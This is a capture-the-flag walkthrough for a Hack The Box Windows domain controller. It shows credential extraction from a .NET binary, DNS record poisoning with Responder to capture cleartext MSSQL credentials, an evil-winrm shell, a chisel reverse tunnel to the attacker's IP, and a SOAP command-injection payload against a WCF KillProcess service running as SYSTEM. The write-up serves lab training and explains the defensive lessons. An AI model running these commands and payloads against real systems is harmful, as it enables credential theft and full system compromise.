# HTB — Overwatch 

**OS:** Windows Server 2022 (Active Directory)
**Difficulty:** Hard
**IP:** 10.129.30.5
**My IP:** 10.10.16.155
**Flags:**
- user.txt: `6f70b[redacted]379614ba8`
- root.txt: `5a500[redacted]bb4c8e0ee`

---

## 🗺️ Cyber Kill Chain Mapping

| Phase | Action |
|---|---|
| **Reconnaissance** | Nmap scan, SMB enumeration |
| **Weaponization** | Extract creds from binary, craft SOAP XML payload |
| **Delivery** | MSSQL linked server trigger, SOAP HTTP request |
| **Exploitation** | DNS poisoning → cleartext cred capture, WCF KillProcess injection |
| **Installation** | Chisel tunnel, evil-winrm shell |
| **C2** | evil-winrm session as sqlmgmt |
| **Actions on Objective** | Read user.txt, inject via WCF → read root.txt as SYSTEM |

---

##  Phase 1 — Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC -p- --min-rate 5000 10.129.30.5
```

**Key open ports:**

| Port | Service | Why it matters |
|---|---|---|
| 53 | DNS | AD DNS — can be poisoned |
| 88 | Kerberos | It's a Domain Controller |
| 445 | SMB | File shares, lateral movement |
| 3389 | RDP | Remote desktop |
| 5985 | WinRM | Remote shell (evil-winrm) |
| 6520 | MSSQL | SQL Server on non-standard port |

> **Why this matters:** Seeing Kerberos (88), LDAP (389), and DNS (53) together tells you immediately this is a **Domain Controller**. MSSQL on a non-standard port (6520 instead of 1433) is unusual — worth investigating.

---

##  Phase 2 — SMB Enumeration

### List shares

```bash
smbclient -L //10.129.30.5 -N
```

**Found:** `software$` share — accessible **anonymously** (no password required).

> **Why this matters:** `$` shares are usually hidden admin shares. An accessible one with no auth is a misconfiguration. Always check SMB null sessions on Windows boxes.

### Browse and grab files

```bash
smbclient //10.129.30.5/software$ -N
smb: \> cd Monitoring
smb: \Monitoring\> get overwatch.exe
smb: \Monitoring\> get overwatch.exe.config
```

**What we got:**
- `overwatch.exe` — a .NET monitoring application (WCF service)
- `overwatch.exe.config` — XML config revealing the WCF endpoint:
  `http://overwatch.htb:8000/MonitorService`

> **Why this matters:** Developers often leave compiled binaries on shares. .NET binaries are **not obfuscated by default** — they are trivially reversible and often contain hardcoded secrets.

---

##  Phase 3 — Extract Credentials from Binary

.NET strings are stored in **UTF-16 Little Endian** format, not ASCII. The `strings` command without flags won't find them.

```bash
strings -el overwatch.exe | grep -iE "password|sqlsvc|Server="
```

**Result:**

Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;


> **Why `-el`?** The `-e l` flag tells `strings` to look for 16-bit little-endian characters — exactly how .NET embeds string literals in compiled IL bytecode.

> **Key Takeaway:** Never hardcode credentials in source code or compiled binaries. `strings -el` is the fastest way to extract secrets from .NET assemblies without installing anything.

**Credentials found:**
sqlsvc : TI0LKcfHzZw1Vv


---

##  Phase 4 — MSSQL Login & Linked Server Discovery

### Connect to MSSQL

```bash
impacket-mssqlclient 'overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@10.129.30.5' \
  -port 6520 -windows-auth
```

> **Why `-windows-auth`?** The credential is a **domain account** (`OVERWATCH\sqlsvc`), not a SQL local login. Windows Authentication uses Kerberos/NTLM, not SQL's built-in auth.

### Check privileges

```sql
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
-- Result: sqlsvc, 0  (guest-level, NOT sysadmin — no xp_cmdshell)
```

### Enumerate linked servers

```sql
EXEC sp_linkedservers;
-- or
SELECT name, data_source FROM sys.servers;
```

**Result:**

S200401\SQLEXPRESS (local)  
SQL07 (linked — another SQL Server)


> **Why this matters:** SQL Server **Linked Servers** allow one SQL instance to query another. When you run a query against a linked server, the local server authenticates to the remote one — often using a **service account with a stored plaintext password**. This is the attack surface.

---

##  Phase 5 — DNS Poisoning + Responder = Cleartext Password Capture

This is the most interesting part. Here's the logic:

1. `SQL07` is a linked server — the name resolves via **Active Directory DNS**
2. `sqlsvc` is in the **DnsAdmins** group (has permission to add DNS records)
3. We add a **fake DNS A record** for `sql07` → pointing to **our Kali IP**
4. We start **Responder** to listen for MSSQL authentication on our IP
5. We trigger the linked server → the DC tries to auth to "SQL07" (our machine) → Responder captures the **cleartext password** of whatever account the linked server uses to authenticate

### Step 1: Add malicious DNS record

```bash
git clone https://github.com/dirkjanm/krbrelayx.git
cd krbrelayx

python3 dnstool.py \
  -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
  -r sql07 -a add -t A -d 10.10.16.155 \
  10.129.30.5
```

**Verify it was added:**
```bash
python3 dnstool.py \
  -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
  -r sql07 -a query \
  10.129.30.5
# Should show: Address 10.10.16.155
```

### Step 2: Start Responder

```bash
sudo responder -I tun0 -w
```

> **What is Responder?** It impersonates network services (MSSQL, SMB, HTTP, etc.) and captures credentials when clients try to authenticate. Since MSSQL linked servers can use cleartext auth, the password comes in unencrypted.

### Step 3: Trigger the linked server query

In your MSSQL session:
```sql
SELECT * FROM OPENQUERY(SQL07, 'SELECT 1');
```

### Result in Responder
[MSSQL] Cleartext Client : 10.129.30.5  
[MSSQL] Cleartext Hostname : SQL07  
[MSSQL] Cleartext Username : sqlmgmt  
[MSSQL] Cleartext Password : bIhBbzMMnB82yx


> **Key Takeaway:** Linked servers that use cleartext MSSQL authentication are a critical misconfiguration. Combined with DnsAdmins group membership allowing DNS record manipulation, this is a devastating credential capture chain.

**New credentials:**
sqlmgmt : bIhBbzMMnB82yx


---

##  Phase 6 — WinRM Shell → user.txt

```bash
evil-winrm -i 10.129.30.5 -u sqlmgmt -p 'bIhBbzMMnB82yx'
```

```powershell
type C:\Users\sqlmgmt\Desktop\user.txt
# 6f70b[redacted]379614ba8
```

> **Why does this work?** Port 5985 (WinRM) was open and `sqlmgmt` is a domain user with WinRM access. `evil-winrm` is a Ruby-based WinRM client that gives a full interactive shell.

---

##  Phase 7 — Chisel Tunnel (Expose Internal Port 8000)

The WCF monitoring service (`overwatch.exe`) runs on **localhost:8000** — not exposed externally. We need to tunnel it through our evil-winrm session.

### On Kali — start chisel server

```bash
# Find chisel (pre-installed on Kali)
which chisel || apt install chisel -y

chisel server -p 9001 --reverse
```

### In evil-winrm — upload and run chisel client

```powershell
upload /usr/bin/chisel C:\Windows\Temp\chisel.exe

C:\Windows\Temp\chisel.exe client 10.10.16.155:9001 R:8000:127.0.0.1:8000
```

> **How chisel works:** The target connects **outbound** to our server on port 9001 (`--reverse`). It then creates a tunnel so that our port 8000 on Kali forwards into the target's `localhost:8000`. This bypasses firewall rules that block inbound connections.

### Add DNS to /etc/hosts on Kali

```bash
sudo sh -c 'echo "127.0.0.1 overwatch.htb" >> /etc/hosts'
```

### Verify the tunnel works

```bash
curl -s http://overwatch.htb:8000/MonitorService | head -3
# Should return HTML/XML — WCF service page visible
```

---

##  Phase 8 — WCF KillProcess Command Injection → root.txt

### Understanding the vulnerability

The `overwatch.exe.config` revealed the WCF service exposes three operations:
- `StartMonitoring`
- `StopMonitoring`
- `KillProcess` ← **vulnerable**

`KillProcess` takes a `processName` string and passes it unsanitized to `Stop-Process` or a `cmd.exe` call on the server. This is a classic **command injection** — the semicolon `;` separates commands in PowerShell.

The service runs as `NT AUTHORITY\SYSTEM` (no reason to drop privileges for a monitoring service), so any injected command runs as **SYSTEM**.

### Craft the SOAP payload

```bash
cat > /tmp/kill.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xmlns:xsd="http://www.w3.org/2001/XMLSchema"
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>notepad; type C:\Users\Administrator\Desktop\root.txt</processName>
    </KillProcess>
  </soap:Body>
</soap:Envelope>
EOF
```

> **Why `notepad;`?** We need a valid process name first to avoid an early error before our injection runs. `notepad` is a safe dummy — even if it's not running, the service continues and executes what follows the `;`.

### Send the SOAP request

```bash
curl -s \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: http://tempuri.org/IMonitoringService/KillProcess" \
  --data @/tmp/kill.xml \
  http://overwatch.htb:8000/MonitorService
```

### Response

```xml
<KillProcessResponse xmlns="http://tempuri.org/">
  <KillProcessResult>5a5001864997fb06bb226a5bb4c8e0ee</KillProcessResult>
</KillProcessResponse>
```

**root.txt:** `5a5001[redacted]bb4c8e0ee` 

> **Key Takeaway:** `&#xD;` in XML is just a carriage return `\r` — not part of the flag. WCF services with `includeExceptionDetailInFaults="True"` and no authentication are trivially exploitable — the WSDL/MEX endpoint advertises every available method to anyone.

---

##  Credential Chain
```
[Anonymous SMB]  
↓  
overwatch.exe (strings -el)  
↓  
sqlsvc : TI0LKcfHzZw1Vv  
↓  
MSSQL port 6520 → Linked Server SQL07  
↓  
DNS poison (dnstool) + Responder  
↓  
sqlmgmt : bIhBbzMMnB82yx  
↓  
evil-winrm → user.txt  
↓  
chisel tunnel → WCF port 8000  
↓  
SOAP KillProcess injection (SYSTEM)  
↓  
root.txt

```


---

##  Key Takeaways

1. **`strings -el` for .NET binaries** — always run this before installing any decompiler. UTF-16 LE strings are invisible to plain `strings`.

2. **SMB null sessions** — anonymous read access to a non-default share is always worth exploring. Developers leave binaries with hardcoded secrets in "internal" shares.

3. **MSSQL Linked Servers = credential theft surface** — when a linked server uses cleartext MSSQL auth, poisoning the DNS record for the linked server name forces the authentication to your machine.

4. **DnsAdmins = underrated privilege** — members can add arbitrary DNS records to AD DNS. This alone enables the entire Phase 5 attack.

5. **WCF services with no auth + `KillProcess`** — any service that executes OS commands based on user-supplied input without sanitization is RCE. Running such a service as SYSTEM makes it an instant root.

6. **Chisel reverse tunnels** — when a port is only listening on localhost internally, reverse port forwarding via an existing shell (evil-winrm) exposes it without firewall issues.

7. **No reverse shell needed** — the WCF response body returned the flag directly. Always check if the service echoes output before going through the effort of a full reverse shell.

---

##  Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port/service enumeration |
| `smbclient` | SMB share browsing and file download |
| `strings -el` | UTF-16 string extraction from .NET binary |
| `impacket-mssqlclient` | MSSQL authentication and querying |
| `krbrelayx/dnstool.py` | Active Directory DNS record manipulation |
| `responder` | Cleartext credential capture |
| `evil-winrm` | WinRM interactive shell |
| `chisel` | Reverse port forwarding tunnel |
| `curl` | Manual SOAP request sending |

---

##  Tags
`#htb` `#windows` `#activedirectory` `#mssql` `#wcf` `#dnspoisoning` `#commandinjection` `#chisel` `#responder` `#hard`
